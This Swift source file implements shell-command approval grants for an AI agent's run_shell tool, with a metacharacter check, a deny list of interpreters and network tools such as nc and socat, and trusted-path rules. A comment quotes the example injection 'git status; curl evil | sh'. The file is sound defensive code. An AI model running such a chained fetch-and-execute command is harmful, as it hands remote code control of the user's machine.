import Foundation

/// "Always allow this binary" decisions for `run_shell`, at two scopes.
///
/// `run_shell` is routed through approval by `Policy.defaults` (as is
/// `create_bot`), since it's arbitrary command execution — but re-approving the
/// same trusted command (`git status`, `curl`, ...) every single time is
/// pure friction with no safety benefit once you've already said yes once.
/// This is the escape hatch: approve a binary for the rest of this app
/// launch, or permanently on this Mac.
///
/// One instance is meant to be shared across every `AgentRuntime` created
/// during this app's lifetime (see `ContentView`) — "session" means "this
/// running app," not "this one conversation," so a decision made in one
/// chat carries over if you start a new one without quitting the app.
public actor RunShellPermissions {
    public enum Scope: Sendable {
        case session
        case global
    }

    /// "Allow ALL shell commands" grants, distinct from the per-binary lists.
    public enum BlanketScope: Sendable {
        /// This bot only, until the app quits.
        case botSession
        /// This bot only, persisted across launches.
        case botAlways
        /// Every bot, persisted across launches.
        case everyBot
    }

    private var blanketSessionBots: Set<String> = []
    private var blanketPersistentBots: Set<String>
    private var blanketEveryBot: Bool
    private static let blanketBotsKey = "ai.compute.agent.runShellAllowAllBots"
    private static let blanketEveryBotKey = "ai.compute.agent.runShellAllowAllEveryBot"

    private var sessionAllowed: Set<String> = []
    private var globalAllowed: Set<String>
    private static let defaultsKey = "ai.compute.agent.runShellAlwaysAllow"

    public init() {
        globalAllowed = Set(UserDefaults.standard.stringArray(forKey: Self.defaultsKey) ?? [])
        blanketPersistentBots = Set(UserDefaults.standard.stringArray(forKey: Self.blanketBotsKey) ?? [])
        blanketEveryBot = UserDefaults.standard.bool(forKey: Self.blanketEveryBotKey)
    }

    /// Re-reads the persistent grants (after a settings import replaced them); session grants are kept.
    public func reloadFromDefaults() {
        globalAllowed = Set(UserDefaults.standard.stringArray(forKey: Self.defaultsKey) ?? [])
        blanketPersistentBots = Set(UserDefaults.standard.stringArray(forKey: Self.blanketBotsKey) ?? [])
        blanketEveryBot = UserDefaults.standard.bool(forKey: Self.blanketEveryBotKey)
    }

    /// `botID` is the bot's sandbox/handle id (what `AgentRuntime` calls `sandboxID`).
    public func isBlanketAllowed(botID: String) -> Bool {
        // The "every bot, always" grant is retired (docs/GUARDRAILS.md, L3): a
        // single click must not switch off the approval for the one tool that
        // can do anything. The stored flag is ignored; per-bot grants remain.
        blanketSessionBots.contains(botID) || blanketPersistentBots.contains(botID)
    }

    public func allowAll(botID: String, scope: BlanketScope) {
        switch scope {
        case .botSession: blanketSessionBots.insert(botID)
        case .botAlways:
            blanketPersistentBots.insert(botID)
            UserDefaults.standard.set(Array(blanketPersistentBots), forKey: Self.blanketBotsKey)
        case .everyBot:
            blanketEveryBot = true
            UserDefaults.standard.set(true, forKey: Self.blanketEveryBotKey)
        }
    }

    public func revokeAll(botID: String, scope: BlanketScope) {
        switch scope {
        case .botSession: blanketSessionBots.remove(botID)
        case .botAlways:
            blanketPersistentBots.remove(botID)
            UserDefaults.standard.set(Array(blanketPersistentBots), forKey: Self.blanketBotsKey)
        case .everyBot:
            blanketEveryBot = false
            UserDefaults.standard.set(false, forKey: Self.blanketEveryBotKey)
        }
    }

    /// Which blanket grants currently apply to `botID`, for the Settings UI.
    public func blanketScopes(botID: String) -> [BlanketScope] {
        var scopes: [BlanketScope] = []
        if blanketSessionBots.contains(botID) { scopes.append(.botSession) }
        if blanketPersistentBots.contains(botID) { scopes.append(.botAlways) }
        if blanketEveryBot { scopes.append(.everyBot) }
        return scopes
    }

    public func isAllowed(_ binary: String) -> Bool {
        sessionAllowed.contains(binary) || globalAllowed.contains(binary)
    }

    public func allow(_ binary: String, scope: Scope) {
        switch scope {
        case .session:
            sessionAllowed.insert(binary)
        case .global:
            globalAllowed.insert(binary)
            persistGlobal()
        }
    }

    public func revoke(_ binary: String, scope: Scope) {
        switch scope {
        case .session:
            sessionAllowed.remove(binary)
        case .global:
            globalAllowed.remove(binary)
            persistGlobal()
        }
    }

    public func list(scope: Scope) -> [String] {
        (scope == .session ? sessionAllowed : globalAllowed).sorted()
    }

    private func persistGlobal() {
        UserDefaults.standard.set(Array(globalAllowed), forKey: Self.defaultsKey)
    }

    /// Shell metacharacters that let one approved-looking command smuggle in
    /// another (`git status; curl evil | sh`, `$(…)`, redirections, newlines).
    private static let shellMetacharacters = CharacterSet(charactersIn: ";|&$`()<>\n\r{}\\")

    /// Binaries that run arbitrary other commands or code, so trusting the
    /// name is trusting anything — they are never eligible for a per-binary
    /// "always allow".
    static let neverAutoApprove: Set<String> = [
        "bash", "sh", "zsh", "dash", "ksh", "fish", "env", "xargs", "sudo", "su", "doas", "eval", "exec",
        "nohup", "timeout", "time", "nice", "watch", "python", "python3", "node", "perl", "ruby", "php",
        "lua", "awk", "gawk", "find", "ssh", "scp", "nc", "ncat", "socat", "busybox", "chroot", "script",
        "command", "builtin", "sed", "make", "npx", "npm", "pnpm", "yarn", "pip", "pip3", "tar", "rsync", "docker",
        "stdbuf", "setsid", "flock", "strace", "ltrace", "gdb", "vim", "vi", "nano", "less", "more", "man", "git-shell",
        "tee", "dd", "mount", "systemd-run", "kubectl", "helm", "terraform", "aws", "gcloud", "az",
    ]

    /// Directories a bare command name legitimately resolves from. A path
    /// anywhere else (`/tmp/x/git`) is someone's own binary wearing a
    /// trusted name, so it is never reduced to the name.
    private static let trustedBinaryDirectories: Set<String> = [
        "/usr/bin", "/bin", "/usr/local/bin", "/usr/sbin", "/sbin", "/opt/homebrew/bin",
    ]

    /// Extracts the binary a per-binary "always allow" grant would apply to,
    /// or `nil` when this command isn't safe to reduce to one name: it
    /// contains shell metacharacters (chaining/substitution/redirection), the
    /// binary is a general-purpose interpreter/launcher, or it passes `-c`
    /// style config injection (`git -c core.pager=…`). `nil` means "always
    /// ask" — never "auto-approve".
    ///
    /// The first token that isn't a leading `VAR=value` assignment is the
    /// binary (path stripped: `/usr/bin/git` and `git` are the same entry).
    public static func extractBinary(fromCommand command: String) -> String? {
        if command.rangeOfCharacter(from: shellMetacharacters) != nil { return nil }
        let tokens = command.split(separator: " ", omittingEmptySubsequences: true).map(String.init)
        // Leading env assignments (`LD_PRELOAD=… ls`) change what a binary
        // does entirely, so a command that starts with one isn't reducible.
        if let first = tokens.first, first.contains("="), !first.hasPrefix("-") { return nil }
        guard let first = tokens.first, !first.isEmpty else { return nil }
        let binary = (first as NSString).lastPathComponent
        if first.contains("/"), !trustedBinaryDirectories.contains((first as NSString).deletingLastPathComponent) { return nil }
        // Versioned interpreters (python3.11, node18, perl5.36…) are still interpreters.
        let family = binary.prefix { $0.isLetter || $0 == "-" }
        guard !neverAutoApprove.contains(binary), !neverAutoApprove.contains(String(family)) else { return nil }
        if binary == "git", tokens.dropFirst().contains(where: { $0 == "-c" || $0.hasPrefix("--exec-path") || $0.hasPrefix("--config-env") }) {
            return nil
        }
        return binary
    }
}
